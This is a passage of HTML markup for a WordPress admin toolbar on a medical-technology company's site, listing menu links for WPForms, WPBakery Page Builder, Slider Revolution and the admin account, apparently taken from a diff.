class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-overview'>All Forms</a></li><li role='group' id='wp-admin-bar-wpforms-add-new'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-builder'>Add New Form</a></li><li role='group' id='wp-admin-bar-wpforms-payments'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-payments'>Payments</a></li><li role='group' id='wp-admin-bar-wpforms-settings' class="menupop"><a class='ab-item' role="menuitem" aria-expanded="false" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-settings'><span class="wp-admin-bar-arrow" aria-hidden="true"></span>Settings</a><div class="ab-sub-wrapper"><ul role='menu' id='wp-admin-bar-wpforms-settings-default' class="ab-submenu"><li role='group' id='wp-admin-bar-wpforms-general-settings'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-settings&#038;view=general'>General</a></li><li role='group' id='wp-admin-bar-wpforms-email-settings'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-settings&#038;view=email'>Email</a></li><li role='group' id='wp-admin-bar-wpforms-captcha-settings'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-settings&#038;view=captcha'>CAPTCHA</a></li><li role='group' id='wp-admin-bar-wpforms-validation-settings'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-settings&#038;view=validation'>Validation</a></li><li role='group' id='wp-admin-bar-wpforms-payments-settings'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-settings&#038;view=payments'>Payments</a></li><li role='group' id='wp-admin-bar-wpforms-integrations-settings'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-settings&#038;view=integrations'>Integrations</a></li><li role='group' id='wp-admin-bar-wpforms-geolocation-settings'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-settings&#038;view=geolocation'>Geolocation</a></li><li role='group' id='wp-admin-bar-wpforms-access-settings'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-settings&#038;view=access'>Access Control</a></li><li role='group' id='wp-admin-bar-wpforms-misc-settings'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-settings&#038;view=misc'>Misc</a></li></ul></div></li><li role='group' id='wp-admin-bar-wpforms-tools' class="menupop"><a class='ab-item' role="menuitem" aria-expanded="false" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-tools'><span class="wp-admin-bar-arrow" aria-hidden="true"></span>Tools</a><div class="ab-sub-wrapper"><ul role='menu' id='wp-admin-bar-wpforms-tools-default' class="ab-submenu"><li role='group' id='wp-admin-bar-wpforms-tools-import'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-tools&#038;view=import'>Import</a></li><li role='group' id='wp-admin-bar-wpforms-tools-export'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-tools&#038;view=export'>Export</a></li><li role='group' id='wp-admin-bar-wpforms-tools-entry-automation'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-tools&#038;view=entry-automation'>Entry Automation</a></li><li role='group' id='wp-admin-bar-wpforms-tools-system'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-tools&#038;view=system'>System Info</a></li><li role='group' id='wp-admin-bar-wpforms-tools-action-scheduler' class="menupop"><a class='ab-item' role="menuitem" aria-expanded="false" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-tools&#038;view=action-scheduler&#038;s=wpforms'><span class="wp-admin-bar-arrow" aria-hidden="true"></span>Scheduled Actions</a><div class="ab-sub-wrapper"><ul role='menu' id='wp-admin-bar-wpforms-tools-action-scheduler-default' class="ab-submenu"><li role='group' id='wp-admin-bar-wpforms-tools-action-scheduler-all'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-tools&#038;view=action-scheduler&#038;s=wpforms&#038;orderby=hook&#038;order=desc'>View All</a></li><li role='group' id='wp-admin-bar-wpforms-tools-action-scheduler-complete'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-tools&#038;view=action-scheduler&#038;s=wpforms&#038;status=complete&#038;orderby=hook&#038;order=desc'>Completed Actions</a></li><li role='group' id='wp-admin-bar-wpforms-tools-action-scheduler-failed'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-tools&#038;view=action-scheduler&#038;s=wpforms&#038;status=failed&#038;orderby=hook&#038;order=desc'>Failed Actions</a></li><li role='group' id='wp-admin-bar-wpforms-tools-action-scheduler-pending'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-tools&#038;view=action-scheduler&#038;s=wpforms&#038;status=pending&#038;orderby=hook&#038;order=desc'>Pending Actions</a></li><li role='group' id='wp-admin-bar-wpforms-tools-action-scheduler-past-due'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-tools&#038;view=action-scheduler&#038;s=wpforms&#038;status=past-due&#038;orderby=hook&#038;order=desc'>Past Due Actions</a></li></ul></div></li><li role='group' id='wp-admin-bar-wpforms-tools-logs'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-tools&#038;view=logs'>Logs</a></li><li role='group' id='wp-admin-bar-wpforms-tools-wpcode'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-tools&#038;view=wpcode'>Code Snippets</a></li></ul></div></li><li role='group' id='wp-admin-bar-wpforms-community'><a class='ab-item' role="menuitem" href='https://www.facebook.com/groups/wpformsvip/' target='_blank' rel='noopener noreferrer'>Community</a></li><li role='group' id='wp-admin-bar-wpforms-help-docs'><a class='ab-item' role="menuitem" href='https://wpforms.com/docs/?utm_campaign=liteplugin&#038;utm_medium=admin-bar&#038;utm_source=WordPress&#038;utm_content=Documentation' target='_blank' rel='noopener noreferrer'>Help Docs</a></li><li role='group' id='wp-admin-bar-wpforms-upgrade'><a class='ab-item' role="menuitem" href='https://wpforms.com/lite-upgrade/?utm_campaign=liteplugin&#038;utm_source=WordPress&#038;utm_medium=admin-bar&#038;utm_content=Upgrade%20to%20Pro&#038;utm_locale=en_US' target='_blank' rel='noopener noreferrer'>Upgrade to Pro</a></li></ul></div></li><li role='group' id='wp-admin-bar-vc_inline-admin-bar-link' class="vc_inline-link"><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/post.php?vc_action=vc_inline&#038;post_id=626&#038;post_type=page'>Edit with WPBakery Page Builder</a></li><li role='group' id='wp-admin-bar-revslider' class="menupop revslider-menu"><a class='ab-item' role="menuitem" aria-expanded="false" href='https://enkaymeditech.com/wp-admin/admin.php?page=revslider'><span class="rs-label">Slider Revolution</span></a><div class="ab-sub-wrapper"><ul role='menu' id='wp-admin-bar-revslider-default' class="ab-submenu"><li role='group' id='wp-admin-bar-Slider-feature' class="revslider-sub-menu"><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=revslider&#038;view=slide&#038;id=slider-1'><span class="rs-label" data-alias="Slider-feature">Slider Feature</span></a></li><li role='group' id='wp-admin-bar-home1' class="revslider-sub-menu"><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=revslider&#038;view=slide&#038;id=slider-2'><span class="rs-label" data-alias="home1">home1</span></a></li><li role='group' id='wp-admin-bar-slider_2' class="revslider-sub-menu"><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=revslider&#038;view=slide&#038;id=slider-3'><span class="rs-label" data-alias="slider_2">Slider Show 2</span></a></li><li role='group' id='wp-admin-bar-Slider-feature1' class="revslider-sub-menu"><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=revslider&#038;view=slide&#038;id=slider-4'><span class="rs-label" data-alias="Slider-feature1">Slider Feature1</span></a></li><li role='group' id='wp-admin-bar-home11' class="revslider-sub-menu"><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=revslider&#038;view=slide&#038;id=slider-5'><span class="rs-label" data-alias="home11">home11</span></a></li><li role='group' id='wp-admin-bar-slider_21' class="revslider-sub-menu"><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=revslider&#038;view=slide&#038;id=slider-6'><span class="rs-label" data-alias="slider_21">Slider Show 21</span></a></li></ul></div></li></ul><ul role='menu' id='wp-admin-bar-top-secondary' class="ab-top-secondary ab-top-menu"><li role='group' id='wp-admin-bar-my-account' class="menupop with-avatar"><a class='ab-item' role="menuitem" aria-expanded="false" href='https://enkaymeditech.com/wp-admin/profile.php'>Howdy, <span class="display-name">admin</span><img alt='' src='https://secure.gravatar.com/avatar/fdc20b3747f159976e32ca7e02d0ad2d5e2a605987506231067e07d55ab356c4?s=26&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/fdc20b3747f159976e32ca7e02d0ad2d5e2a605987506231067e07d55ab356c4?s=52&#038;d=mm&#038;r=g 2x' class='avatar avatar-26 photo' height='26' width='26' loading='lazy' decoding='async'/></a><div class="ab-sub-wrapper"><ul role='menu' aria-label='Howdy, admin' id='wp-admin-bar-user-actions' class="ab-submenu"><li role='group' id='wp-admin-bar-user-info'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/profile.php'><img alt='' src='https://secure.gravatar.com/avatar/fdc20b3747f159976e32ca7e02d0ad2d5e2a605987506231067e07d55ab356c4?s=64&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/fdc20b3747f159976e32ca7e02d0ad2d5e2a605987506231067e07d55ab356c4?s=128&#038;d=mm&#038;r=g 2x' class='avatar avatar-64 photo' height='64' width='64' loading='lazy' decoding='async'/><span class='display-name'>admin</span><span class='display-name edit-profile'>Edit Profile</span></a></li><li role='group' id='wp-admin-bar-logout'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-login.php?action=logout&#038;_wpnonce=572f154333'>Log Out</a></li></ul></div></li><li role='group' id='wp-admin-bar-search' class="admin-bar-search"><div class="ab-item ab-empty-item" tabindex="-1" role="menuitem"><form action="https://enkaymeditech.com/" method="get" id="adminbarsearch"><input class="adminbar-input" name="s" id="adminbar-search" type="text" value="" maxlength="150" /><label for="adminbar-search" class="screen-reader-text">Search</label><input type="submit" class="adminbar-button" value="Search" /></form></div></li></ul>			</div>
+		</div>
+
+		
+</body>
+</html>
